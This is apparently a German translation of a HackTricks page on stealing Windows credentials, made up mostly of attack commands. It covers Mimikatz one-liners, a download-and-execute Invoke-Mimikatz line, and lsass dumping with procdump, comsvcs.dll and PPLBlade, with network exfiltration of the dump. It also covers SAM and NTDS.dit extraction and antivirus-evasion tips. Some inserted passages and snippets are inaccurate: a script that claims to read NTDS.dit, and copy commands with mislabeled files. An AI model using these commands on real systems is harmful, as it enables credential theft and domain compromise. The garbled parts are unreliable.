# Stehlen von Windows-Anmeldeinformationen

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

## Mimikatz-Anmeldeinformationen
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Weitere Funktionen, die Mimikatz ausführen kann, finden Sie auf** [**dieser Seite**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Hier erfahren Sie mehr über mögliche Schutzmaßnahmen für Anmeldedaten.**](credentials-protections.md) **Diese Schutzmaßnahmen könnten verhindern, dass Mimikatz einige Anmeldeinformationen extrahiert.**

## Anmeldeinformationen mit Meterpreter

Verwenden Sie das [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials), **das** ich erstellt habe, um nach Passwörtern und Hashes im Opfer zu suchen.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Umgehung der AV

### Procdump + Mimikatz

Da **Procdump von** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**ein legitimes Microsoft-Tool** ist, wird es von Defender nicht erkannt.\
Sie können dieses Tool verwenden, um den lsass-Prozess zu **dumpen**, den **Dump herunterzuladen** und die **Anmeldeinformationen lokal** aus dem Dump zu **extrahieren**.

{% code title="Dump lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% code title="Extrahieren von Anmeldedaten aus dem Dump" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

Dieser Vorgang wird automatisch mit [SprayKatz](https://github.com/aas-n/spraykatz) durchgeführt: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Hinweis**: Einige **AV** können die Verwendung von **procdump.exe zum Dumpen von lsass.exe** als **bösartig** erkennen, da sie die Zeichenfolge **"procdump.exe" und "lsass.exe"** erkennen. Es ist daher unauffälliger, anstelle des Namens lsass.exe die **PID** von lsass.exe als **Argument** an procdump zu übergeben.

### Dumpen von lsass mit **comsvcs.dll**

Eine DLL mit dem Namen **comsvcs.dll**, die sich in `C:\Windows\System32` befindet, ist für das **Dumpen des Prozessspeichers** im Falle eines Absturzes verantwortlich. Diese DLL enthält eine Funktion namens **`MiniDumpW`**, die mit `rundll32.exe` aufgerufen werden kann.\
Die ersten beiden Argumente sind irrelevant, aber das dritte Argument besteht aus drei Komponenten. Die Prozess-ID, die gedumpt werden soll, bildet die erste Komponente, der Speicherort der Dump-Datei die zweite und die dritte Komponente ist ausschließlich das Wort **full**. Es gibt keine alternativen Optionen.\
Beim Parsen dieser drei Komponenten erstellt die DLL die Dump-Datei und überträgt den Speicher des angegebenen Prozesses in diese Datei.\
Die Verwendung der **comsvcs.dll** ist für das Dumpen des lsass-Prozesses möglich, wodurch das Hochladen und Ausführen von procdump entfällt. Diese Methode wird detailliert unter [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) beschrieben.

Der folgende Befehl wird zur Ausführung verwendet:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Sie können diesen Prozess mit** [**lssasy**](https://github.com/Hackndo/lsassy)** automatisieren.**

### **Dumping von lsass mit dem Task-Manager**

1. Klicken Sie mit der rechten Maustaste auf die Taskleiste und wählen Sie Task-Manager aus.
2. Klicken Sie auf "Mehr Details".
3. Suchen Sie den Prozess "Local Security Authority Process" im Tab "Prozesse".
4. Klicken Sie mit der rechten Maustaste auf den Prozess "Local Security Authority Process" und wählen Sie "Erstellen Sie eine Dump-Datei".

### Dumping von lsass mit procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) ist eine von Microsoft signierte Binärdatei, die Teil der [Sysinternals](https://docs.microsoft.com/en-us/sysinternals/) Suite ist.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumpin lsass mit PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) ist ein geschütztes Prozess-Dump-Tool, das die Verschleierung von Memory-Dumps unterstützt und diese auf entfernte Workstations überträgt, ohne sie auf die Festplatte abzulegen.

**Hauptfunktionen**:

1. Umgehung des PPL-Schutzes
2. Verschleierung von Memory-Dump-Dateien, um die Erkennungsmechanismen der Defender-Signaturen zu umgehen
3. Hochladen von Memory-Dumps mit den Methoden RAW und SMB, ohne sie auf die Festplatte abzulegen (fileless dump)

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### SAM-Hashes auslesen
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### LSA-Secrets auslesen

Um LSA-Secrets auszulesen, können verschiedene Tools verwendet werden. Ein beliebtes Tool ist "Mimikatz", das in der Lage ist, die LSA-Secrets aus dem Speicher des Windows-Betriebssystems zu extrahieren.

#### Schritt 1: Mimikatz herunterladen

Laden Sie die neueste Version von Mimikatz von der offiziellen GitHub-Seite herunter.

#### Schritt 2: Mimikatz ausführen

Führen Sie Mimikatz auf dem Ziel-Windows-System aus. Beachten Sie, dass Administratorrechte erforderlich sind, um auf die LSA-Secrets zugreifen zu können.

#### Schritt 3: LSA-Secrets auslesen

Geben Sie den Befehl `sekurlsa::logonpasswords` in Mimikatz ein, um die LSA-Secrets auszulesen. Dieser Befehl zeigt die Benutzernamen und Passwörter an, die im Speicher des Systems gespeichert sind.

#### Schritt 4: Sicherheitsvorkehrungen treffen

Nachdem Sie die LSA-Secrets extrahiert haben, ist es wichtig, Sicherheitsvorkehrungen zu treffen, um zu verhindern, dass diese Informationen in falsche Hände geraten. Stellen Sie sicher, dass das System regelmäßig aktualisiert wird und dass starke Passwörter verwendet werden.

> Hinweis: Das Auslesen von LSA-Secrets ist eine potenziell illegale Aktivität und sollte nur zu legitimen Zwecken und mit entsprechender Genehmigung durchgeführt werden.
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dumpen Sie die NTDS.dit von der Ziel-DC

Um die NTDS.dit-Datei von einem Ziel-DC zu dumpen, können Sie das Tool `ntdsutil` verwenden. Befolgen Sie die folgenden Schritte:

1. Melden Sie sich bei einem Domänencontroller mit Administratorrechten an.
2. Öffnen Sie eine Eingabeaufforderung als Administrator.
3. Geben Sie den Befehl `ntdsutil` ein und drücken Sie die Eingabetaste, um das Dienstprogramm zu starten.
4. Geben Sie den Befehl `activate instance ntds` ein und drücken Sie die Eingabetaste, um den NTDS-Kontext zu aktivieren.
5. Geben Sie den Befehl `ifm` ein und drücken Sie die Eingabetaste, um den IFM-Modus (Install From Media) zu aktivieren.
6. Geben Sie den Befehl `create full <Pfad zum Zielordner>` ein und drücken Sie die Eingabetaste, um den vollständigen Dump der NTDS.dit-Datei zu erstellen. Stellen Sie sicher, dass Sie den Pfad zum Zielordner angeben, in dem die NTDS.dit-Datei gespeichert werden soll.
7. Warten Sie, bis der Dumpvorgang abgeschlossen ist.
8. Übertragen Sie die NTDS.dit-Datei sicher auf Ihren lokalen Computer oder einen anderen Speicherort.

Bitte beachten Sie, dass das Dumpen der NTDS.dit-Datei sensible Informationen enthüllen kann und nur zu legitimen Zwecken durchgeführt werden sollte, wie z.B. zur forensischen Analyse oder zur Sicherung von Active Directory-Daten.
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dumpen Sie die NTDS.dit-Passwort-Historie vom Ziel-DC

Um die Passwort-Historie der NTDS.dit-Datenbank von einem Ziel-DC zu dumpen, können Sie das Tool `secretsdump.py` aus dem Impacket-Framework verwenden. Dieses Tool ermöglicht es Ihnen, die NTDS.dit-Datenbank zu extrahieren und die darin enthaltenen Passwort-Hashes zu analysieren.

Führen Sie den folgenden Befehl aus, um die NTDS.dit-Passwort-Historie zu dumpen:

```plaintext
secretsdump.py <Ziel-DC-IP> -just-dc-ntlm
```

Ersetzen Sie `<Ziel-DC-IP>` durch die IP-Adresse des Ziel-DCs.

Das Tool wird die NTDS.dit-Datenbank extrahieren und die Passwort-Hashes in einem lesbaren Format anzeigen. Sie können dann die Passwort-Historie analysieren und potenziell verwundbare Passwörter identifizieren.

**Hinweis:** Das Dumpen der NTDS.dit-Datenbank erfordert administrative Zugriffsrechte auf den Ziel-DC. Stellen Sie sicher, dass Sie über die erforderlichen Berechtigungen verfügen, bevor Sie diesen Vorgang durchführen.
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Zeigen Sie das Attribut pwdLastSet für jedes NTDS.dit-Konto an

Um das Attribut `pwdLastSet` für jedes NTDS.dit-Konto anzuzeigen, können Sie die folgende Methode verwenden:

```powershell
$ntds = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().GetDirectoryEntry()
$searcher = New-Object System.DirectoryServices.DirectorySearcher($ntds)
$searcher.Filter = "(objectCategory=User)"
$searcher.PropertiesToLoad.Add("pwdLastSet")

$results = $searcher.FindAll()

foreach ($result in $results) {
    $account = $result.GetDirectoryEntry()
    $pwdLastSet = $account.pwdLastSet.Value

    Write-Host "Account: $($account.Name)"
    Write-Host "pwdLastSet: $($pwdLastSet)"
    Write-Host ""
}

$searcher.Dispose()
```

Dieser Code verwendet die `System.DirectoryServices`-Namespace in PowerShell, um eine Verbindung zur NTDS.dit-Datenbank herzustellen und nach Benutzerkonten zu suchen. Der Filter `(objectCategory=User)` stellt sicher, dass nur Benutzerkonten zurückgegeben werden.

Für jedes gefundene Konto wird das Attribut `pwdLastSet` abgerufen und angezeigt.
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stehlen von SAM & SYSTEM

Diese Dateien sollten sich in _C:\windows\system32\config\SAM_ und _C:\windows\system32\config\SYSTEM_ befinden. Aber **Sie können sie nicht einfach auf herkömmliche Weise kopieren**, da sie geschützt sind.

### Aus der Registrierung

Der einfachste Weg, diese Dateien zu stehlen, besteht darin, eine Kopie aus der Registrierung zu erhalten:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Lade** diese Dateien auf deine Kali-Maschine herunter und **extrahiere die Hashes** mit folgendem Befehl:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Sie können eine Kopie geschützter Dateien mithilfe dieses Dienstes erstellen. Sie müssen Administrator sein.

#### Verwendung von vssadmin

Das vssadmin-Binary ist nur in Windows Server-Versionen verfügbar.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Aber Sie können dasselbe mit **Powershell** tun. Hier ist ein Beispiel, wie Sie die SAM-Datei kopieren können (die Festplatte "C:" wird verwendet und sie wird in C:\Benutzer\Öffentlich gespeichert), aber Sie können dies verwenden, um jede geschützte Datei zu kopieren:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Code from the book: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Schließlich könnten Sie auch das [**PS-Skript Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) verwenden, um eine Kopie von SAM, SYSTEM und ntds.dit zu erstellen.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory-Anmeldeinformationen - NTDS.dit**

Die Datei **NTDS.dit** ist als das Herzstück von **Active Directory** bekannt und enthält wichtige Daten über Benutzerobjekte, Gruppen und deren Mitgliedschaften. Hier werden die **Passworthashes** für Domänenbenutzer gespeichert. Diese Datei ist eine **Extensible Storage Engine (ESE)**-Datenbank und befindet sich unter **_%SystemRoom%/NTDS/ntds.dit_**.

In dieser Datenbank werden drei Haupttabellen verwaltet:

- **Datentabelle**: Diese Tabelle speichert Details über Objekte wie Benutzer und Gruppen.
- **Verknüpfungstabelle**: Sie verfolgt Beziehungen wie Gruppenmitgliedschaften.
- **SD-Tabelle**: Hier werden die **Sicherheitsdeskriptoren** für jedes Objekt gespeichert, um die Sicherheit und den Zugriffsschutz für die gespeicherten Objekte zu gewährleisten.

Weitere Informationen dazu finden Sie unter: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows verwendet _Ntdsa.dll_, um mit dieser Datei zu interagieren, und sie wird von _lsass.exe_ verwendet. Ein **Teil** der **NTDS.dit**-Datei könnte sich **im Speicher von `lsass`** befinden (Sie können die zuletzt zugegriffenen Daten wahrscheinlich aufgrund der Leistungsverbesserung durch Verwendung eines **Caches** finden).

#### Entschlüsseln der Hashes in NTDS.dit

Der Hash wird 3-mal verschlüsselt:

1. Entschlüsseln des Passwortverschlüsselungsschlüssels (**PEK**) mithilfe des **BOOTKEY** und **RC4**.
2. Entschlüsseln des **Hashes** mithilfe von **PEK** und **RC4**.
3. Entschlüsseln des **Hashes** mithilfe von **DES**.

**PEK** hat in **jedem Domänencontroller den gleichen Wert**, ist jedoch in der **NTDS.dit**-Datei mithilfe des **BOOTKEY** der **SYSTEM-Datei des Domänencontrollers (unterscheidet sich zwischen Domänencontrollern)** verschlüsselt. Aus diesem Grund benötigen Sie zum Abrufen der Anmeldeinformationen aus der NTDS.dit-Datei die Dateien NTDS.dit und SYSTEM (_C:\Windows\System32\config\SYSTEM_).

### Kopieren von NTDS.dit mit Ntdsutil

Verfügbar seit Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Sie können auch den Trick mit dem [**Volume Shadow Copy**](./#stealing-sam-and-system) verwenden, um die Datei **ntds.dit** zu kopieren. Denken Sie daran, dass Sie auch eine Kopie der **SYSTEM-Datei** benötigen (erneut, [**dumpen Sie sie aus der Registrierung oder verwenden Sie den Volume Shadow Copy**](./#stealing-sam-and-system) Trick).

### **Extrahieren von Hashes aus NTDS.dit**

Sobald Sie die Dateien **NTDS.dit** und **SYSTEM** erhalten haben, können Sie Tools wie _secretsdump.py_ verwenden, um die Hashes zu **extrahieren**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Sie können sie auch **automatisch extrahieren**, indem Sie einen gültigen Domänenadministrator-Benutzer verwenden:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Für **große NTDS.dit-Dateien** wird empfohlen, diese mit [gosecretsdump](https://github.com/c-sto/gosecretsdump) zu extrahieren.

Schließlich können Sie auch das **Metasploit-Modul** verwenden: _post/windows/gather/credentials/domain\_hashdump_ oder **mimikatz** `lsadump::lsa /inject`

### **Extrahieren von Domänenobjekten aus NTDS.dit in eine SQLite-Datenbank**

NTDS-Objekte können mit [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) in eine SQLite-Datenbank extrahiert werden. Dabei werden nicht nur Geheimnisse extrahiert, sondern auch die gesamten Objekte und ihre Attribute für weitere Informationsgewinnung, wenn die rohe NTDS.dit-Datei bereits abgerufen wurde.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Die `SYSTEM`-Hive ist optional, ermöglicht jedoch das Entschlüsseln von Geheimnissen (NT- und LM-Hashes, ergänzende Anmeldeinformationen wie Klartext-Passwörter, Kerberos- oder Trust-Schlüssel, NT- und LM-Passwortverlauf). Zusammen mit anderen Informationen werden folgende Daten extrahiert: Benutzer- und Maschinenkonten mit ihren Hashes, UAC-Flags, Zeitstempel für die letzte Anmeldung und Passwortänderung, Kontobeschreibungen, Namen, UPN, SPN, Gruppen und rekursive Mitgliedschaften, organisatorische Einheiten und Mitgliedschaften, vertrauenswürdige Domänen mit Trust-Typ, Richtung und Attributen...

## Lazagne

Laden Sie die ausführbare Datei von [hier](https://github.com/AlessandroZ/LaZagne/releases) herunter. Sie können diese ausführbare Datei verwenden, um Anmeldeinformationen aus verschiedenen Softwareanwendungen zu extrahieren.
```
lazagne.exe all
```
## Andere Tools zum Extrahieren von Anmeldedaten aus SAM und LSASS

### Windows Credentials Editor (WCE)

Dieses Tool kann verwendet werden, um Anmeldedaten aus dem Speicher zu extrahieren. Laden Sie es von folgender Adresse herunter: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extrahieren Sie Anmeldedaten aus der SAM-Datei.
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Extrahiere Anmeldeinformationen aus der SAM-Datei.
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Laden Sie es von [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) herunter und führen Sie es einfach aus, um die Passwörter zu extrahieren.

## Abwehrmaßnahmen

[**Erfahren Sie hier mehr über den Schutz von Anmeldeinformationen.**](credentials-protections.md)

<details>

<summary><strong>Erfahren Sie alles über das Hacken von AWS von Anfang an bis zum Experten mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
